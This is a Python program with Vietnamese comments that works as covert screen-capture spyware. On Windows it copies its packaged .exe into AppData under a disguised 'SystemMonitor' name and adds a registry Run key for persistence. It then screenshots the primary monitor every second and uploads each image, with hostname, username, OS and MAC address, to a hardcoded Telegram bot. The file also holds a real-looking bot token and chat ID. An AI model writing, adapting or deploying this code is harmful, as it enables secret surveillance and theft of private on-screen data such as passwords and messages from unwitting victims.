import mss
from PIL import Image
import getmac
import platform
import socket
from datetime import datetime
import time
import io
import os
import sys
import shutil
import winreg
import requests

# ===================== CẤU HÌNH =====================
TELEGRAM_BOT_TOKEN = "8679545966:AAHMprJKcHNrAM3ayUXYmBTafCZMzLswhyw"
TELEGRAM_CHAT_ID   = "6598981644"
# ====================================================


def add_to_startup() -> None:
    """
    Copy file .exe vào AppData và đăng ký tự khởi động cùng Windows.

    Quy trình:
      1. Bỏ qua nếu đang chạy từ file .py (môi trường dev, chưa đóng gói).
      2. Tạo thư mục cố định: %APPDATA%\\SystemMonitor
      3. Copy .exe hiện tại vào thư mục đó với tên tút_tút.exe (nếu chưa ở đó).
      4. Ghi đường dẫn AppData vào Registry HKCU Run — đường dẫn có dấu ngoặc kép
         để xử lý đúng các path có khoảng trắng.
    """
    app_name    = "SystemMonitorApp"
    target_name = "tút_tút.exe"
    reg_path    = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        current_exe = sys.executable

        # 1. Chỉ chạy khi đã đóng gói thành .exe
        if not current_exe.lower().endswith(".exe"):
            print("[STARTUP] Đang chạy từ môi trường Python, bỏ qua đăng ký startup.")
            return

        # 2. Tạo thư mục đích trong AppData (tạo ngay cả khi đã tồn tại)
        appdata     = os.environ.get("APPDATA", os.path.expanduser("~"))
        install_dir = os.path.join(appdata, "SystemMonitor")
        os.makedirs(install_dir, exist_ok=True)

        target_exe = os.path.join(install_dir, target_name)

        # 3. Copy file nếu chưa nằm sẵn trong thư mục đích
        if os.path.abspath(current_exe) != os.path.abspath(target_exe):
            shutil.copy2(current_exe, target_exe)
            print(f"[STARTUP] Đã copy .exe vào: {target_exe}")
        else:
            print("[STARTUP] File đã nằm đúng vị trí AppData, không cần copy lại.")

        # 4. Ghi vào Registry — bọc path trong dấu ngoặc kép để xử lý khoảng trắng
        reg_value = f'"{target_exe}"'
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            reg_path,
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, reg_value)
        winreg.CloseKey(key)
        print(f"[STARTUP] Đã đăng ký Registry: {reg_value}")

    except PermissionError:
        print("[STARTUP] Không đủ quyền. Bỏ qua tính năng auto-start.")
    except OSError as e:
        print(f"[STARTUP] Lỗi hệ thống: {e}. Bỏ qua tính năng auto-start.")
    except Exception as e:
        print(f"[STARTUP] Lỗi không xác định: {e}. Bỏ qua tính năng auto-start.")


def validate_config() -> bool:
    """
    Kiểm tra tính hợp lệ của TELEGRAM_BOT_TOKEN và TELEGRAM_CHAT_ID.

    Trả về True nếu cả hai đều đã được điền, False nếu còn để mặc định
    hoặc bị bỏ trống. In thông báo lỗi cụ thể để dễ debug.
    """
    errors = []

    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.strip() == "ĐIỀN_TOKEN_TẠI_ĐÂY":
        errors.append("TELEGRAM_BOT_TOKEN chưa được cấu hình.")

    if not TELEGRAM_CHAT_ID or TELEGRAM_CHAT_ID.strip() == "ĐIỀN_CHAT_ID_TẠI_ĐÂY":
        errors.append("TELEGRAM_CHAT_ID chưa được cấu hình.")

    if errors:
        for msg in errors:
            print(f"[LỖI CẤU HÌNH] {msg}")
        return False

    return True


def get_system_info() -> str:
    """
    Trả về chuỗi thông tin hệ thống gồm:
      - Hostname  : tên máy tính trong mạng
      - OS        : tên + phiên bản hệ điều hành
      - Username  : tên tài khoản người dùng hiện tại
    """
    hostname = socket.gethostname()
    os_name  = platform.system()          # Windows / Linux / Darwin
    os_release = platform.release()       # 10, 11, 22.04, ...
    username = platform.node()            # fallback nếu không có os.getlogin

    # os.getlogin() đáng tin cậy hơn trên đa nền tảng
    try:
        import os
        username = os.getlogin()
    except Exception:
        pass  # giữ platform.node() làm fallback

    return (
        f"Hostname : {hostname}\n"
        f"OS       : {os_name} {os_release}\n"
        f"Username : {username}"
    )


def get_device_mac() -> str:
    """
    Trả về địa chỉ MAC của thiết bị dùng thư viện getmac.
    Nếu không lấy được (quyền hạn, môi trường ảo, ...) trả về 'Unknown MAC'.
    """
    try:
        mac = getmac.get_mac_address()
        if mac:
            return mac
        return "Unknown MAC"
    except Exception:
        return "Unknown MAC"


def capture_screenshot_bytes() -> io.BytesIO:
    """
    Chụp toàn bộ màn hình chính và trả về dữ liệu ảnh JPEG trong bộ nhớ.

    Quy trình:
      1. mss chụp màn hình chính (monitor 1) dưới dạng raw pixel BGRA.
      2. PIL chuyển đổi sang RGB (JPEG không hỗ trợ kênh alpha).
      3. Nén JPEG chất lượng 75 % và lưu thẳng vào BytesIO — không ghi file.
      4. Con trỏ BytesIO được đặt lại về đầu (seek 0) để sẵn sàng đọc.

    Returns:
        io.BytesIO: buffer chứa dữ liệu ảnh JPEG.
    """
    with mss.mss() as sct:
        # monitors[0] = toàn bộ màn hình ảo (multi-monitor)
        # monitors[1] = màn hình chính (primary monitor)
        monitor = sct.monitors[1]
        raw = sct.grab(monitor)

        # Chuyển raw BGRA → PIL Image RGB
        img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")

    buffer = io.BytesIO()
    img.save(
        buffer,
        format="JPEG",
        quality=75,          # 70-80 %: cân bằng tốt giữa dung lượng và độ nét
        optimize=True,       # bật Huffman optimization — giảm thêm ~5-10 % size
        progressive=False,   # tắt progressive scan để giảm overhead xử lý
    )
    buffer.seek(0)           # đặt con trỏ về đầu để caller có thể đọc ngay
    return buffer


def send_telegram_photo(image_bytes: io.BytesIO, caption: str = "") -> bool:
    """
    Gửi ảnh kèm caption lên Telegram qua Bot API endpoint sendPhoto.

    Args:
        image_bytes: BytesIO chứa dữ liệu ảnh JPEG (con trỏ ở vị trí 0).
        caption    : Chuỗi chú thích kèm theo ảnh (tối đa 1024 ký tự).

    Returns:
        True  nếu gửi thành công (HTTP 200 + ok=true).
        False nếu gặp lỗi bất kỳ.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"

    try:
        response = requests.post(
            url,
            data={
                "chat_id": TELEGRAM_CHAT_ID,
                "caption": caption[:1024],   # Telegram giới hạn 1024 ký tự
            },
            files={
                "photo": ("screenshot.jpg", image_bytes, "image/jpeg"),
            },
            timeout=20,   # giây — tránh treo vô hạn khi mạng chậm
        )

        # --- Xử lý Rate Limit (HTTP 429) ---
        if response.status_code == 429:
            retry_after = response.json().get("parameters", {}).get("retry_after", 30)
            print(f"[RATE LIMIT] Telegram yêu cầu chờ {retry_after}s. Bỏ qua lần gửi này.")
            return False

        # --- Xử lý lỗi HTTP khác ---
        if not response.ok:
            print(f"[LỖI API] HTTP {response.status_code}: {response.text[:200]}")
            return False

        # --- Kiểm tra phản hồi JSON ---
        result = response.json()
        if not result.get("ok"):
            print(f"[LỖI TELEGRAM] {result.get('description', 'Không rõ lỗi')}")
            return False

        return True

    except requests.exceptions.ConnectionError:
        print("[LỖI MẠNG] Không thể kết nối tới Telegram. Kiểm tra internet.")
        return False

    except requests.exceptions.Timeout:
        print("[LỖI MẠNG] Yêu cầu gửi ảnh bị timeout sau 20 giây.")
        return False

    except requests.exceptions.RequestException as e:
        print(f"[LỖI REQUESTS] {e}")
        return False


def main() -> None:
    """
    Vòng lặp chính: cứ mỗi 1 giây chụp màn hình và gửi lên Telegram.
    Nhấn Ctrl+C để dừng chương trình an toàn.
    """
    if not validate_config():
        print("[DỪNG] Vui lòng điền TELEGRAM_BOT_TOKEN và TELEGRAM_CHAT_ID trước khi chạy.")
        return

    # Đăng ký tự khởi động cùng Windows (thất bại sẽ bỏ qua, không crash)
    add_to_startup()

    print("[BẮT ĐẦU] Đang chạy... Nhấn Ctrl+C để dừng.")

    while True:
        try:
            # 1. Thu thập thông tin
            now        = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            sys_info   = get_system_info()
            mac_addr   = get_device_mac()

            # 2. Ghép caption
            caption = (
                f"🕐 Thời gian : {now}\n"
                f"💻 {sys_info}\n"
                f"🔌 MAC       : {mac_addr}"
            )

            # 3. Chụp màn hình
            image_bytes = capture_screenshot_bytes()

            # 4. Gửi lên Telegram
            send_telegram_photo(image_bytes, caption)

            # 5. Chờ 1 giây trước lần chụp tiếp theo
            time.sleep(1)

        except KeyboardInterrupt:
            # 6. Ctrl+C — thoát an toàn
            print("\n[DỪNG] Chương trình đã được ngắt bởi người dùng.")
            break


if __name__ == "__main__":
    main()
